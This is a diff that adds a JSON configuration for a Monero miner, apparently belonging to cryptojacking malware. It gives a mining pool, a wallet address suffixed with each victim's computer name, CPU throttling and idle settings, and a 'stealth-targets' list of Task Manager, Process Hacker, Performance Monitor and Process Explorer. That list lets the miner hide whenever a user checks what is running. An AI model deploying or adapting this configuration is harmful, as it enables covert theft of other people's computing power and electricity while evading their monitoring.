@@ -1,0 +1,14 @@
+{
+    "algo": "rx/0",
+    "pool": "rx.unmineable.com",
+    "port": 3333,
+    "wallet": "XMR:47nejG3vYEkeEnfgMfEZkAPc6k8sjHtAvh1ooXyY71QoNSjJmpm3DGdDLzat711RozRE8E28PU6FnDmGTSDYAZH3BG7UnSX.{COMPUTERNAME}#x3dm-mwmp",
+    "password": "",
+    "nicehash": false,
+    "ssltls": false,
+    "max-cpu": 60,
+    "idle-wait": 0,
+    "idle-cpu": 80,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": ""
+}
